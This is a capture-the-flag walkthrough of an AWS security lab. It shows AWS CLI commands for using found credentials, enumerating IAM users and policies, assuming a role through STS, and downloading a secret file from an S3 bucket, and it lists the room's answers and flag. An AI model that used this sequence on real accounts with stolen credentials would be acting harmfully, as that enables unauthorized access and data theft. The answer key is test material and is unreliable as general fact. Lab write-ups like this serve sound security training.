# 🎄 Advent of Cyber 2025 – Day 23
## AWS Security – S3cret Santa (DETAILED WALKTHROUGH)

<img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/5ed5961c6276df568891c3ea-1764055517343.png" alt="Room Banner / AWS Setup" width="700">

--------------------------------------------------

ROOM OVERVIEW  
Room: AWS Security – S3cret Santa  
Focus: AWS Enumeration & Cloud Security  
Tools: AWS CLI, IAM, STS, S3  
Time: ~30 minutes  
Status: 100% Completed  

--------------------------------------------------

LEARNING OBJECTIVES
- Understand AWS account basics
- Enumerate IAM users, roles, and policies
- Use AWS CLI from an attacker’s perspective
- Assume IAM roles using STS
- Access and extract files from S3 buckets

--------------------------------------------------

TASK 1 – INTRODUCTION

An infiltrated elf finds AWS credentials on Sir Carrotbane’s desktop.
These credentials may allow access to TBFC’s cloud environment.

AWS accounts can be accessed using:
- Access Key ID
- Secret Access Key

Credentials are already configured at:
~/.aws/credentials

VERIFY CREDENTIALS:
aws sts get-caller-identity

Answer:
Account ID = 123456789012

--------------------------------------------------


TASK 2 – IAM: USERS, ROLES, GROUPS, POLICIES
<img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/5ed5961c6276df568891c3ea-1764127702407.png" alt="IAM Enumeration / AWS CLI Output" width="700">

IAM USERS  
Individual identities with credentials.

IAM GROUPS  
Collections of users for permission management.

IAM ROLES  
Temporary identities that can be assumed.

IAM POLICIES  
JSON documents defining:
- Action
- Resource
- Effect
- Principal
<img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/5ed5961c6276df568891c3ea-1764127718214.png" alt="IAM Enumeration / AWS CLI Output" width="700">

QUESTION:
What IAM component defines permissions?

Answer:
policy

--------------------------------------------------

TASK 3 – ENUMERATING USER PERMISSIONS

List users:
aws iam list-users

List inline policies:
aws iam list-user-policies --user-name sir.carrotbane

List attached policies:
aws iam list-attached-user-policies --user-name sir.carrotbane

List groups:
aws iam list-groups-for-user --user-name sir.carrotbane

Get policy details:
aws iam get-user-policy --policy-name POLICYNAME --user-name sir.carrotbane

Answer:
SirCarrotbanePolicy

--------------------------------------------------


TASK 4 – ASSUMING ROLES

List roles:
aws iam list-roles

Role discovered:
bucketmaster

View role policy:
aws iam get-role-policy --role-name bucketmaster --policy-name BucketMasterPolicy

Permissions:
- s3:ListAllMyBuckets
- s3:ListBucket
- s3:GetObject

Assume role:
aws sts assume-role \
--role-arn arn:aws:iam::123456789012:role/bucketmaster \
--role-session-name TBFC

Set temporary credentials:
export AWS_ACCESS_KEY_ID="ASIAxxxxxxxx"
export AWS_SECRET_ACCESS_KEY="xxxxxxxx"
export AWS_SESSION_TOKEN="xxxxxxxx"

Verify:
aws sts get-caller-identity

Answer:
ListAllMyBuckets

--------------------------------------------------

TASK 5 – GRABBING A FILE FROM S3

List buckets:
aws s3api list-buckets

List objects:
aws s3api list-objects --bucket easter-secrets-123145

Download file:
aws s3api get-object \
--bucket easter-secrets-123145 \
--key cloud_password.txt \
cloud_password.txt

File content:
THM{more_like_sir_cloudbane}

--------------------------------------------------

FINAL ANSWERS

Account ID:
123456789012
<img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/5ed5961c6276df568891c3ea-1764128730134.png" alt="Assuming Role / STS Credentials" width="700">

IAM permission component:
policy

User policy name:
SirCarrotbanePolicy

Extra role permission:
ListAllMyBuckets

S3 secret:
THM{more_like_sir_cloudbane}

--------------------------------------------------

KEY TAKEAWAYS
- IAM misconfiguration enables privilege escalation
- sts:AssumeRole is extremely powerful
- S3 buckets often contain sensitive data
- Enumeration is critical in cloud security

--------------------------------------------------

CONCLUSION

This room demonstrates real-world AWS attacker techniques:
- IAM enumeration
- Role assumption
- Cloud data exfiltration

Room Status: 100% Completed
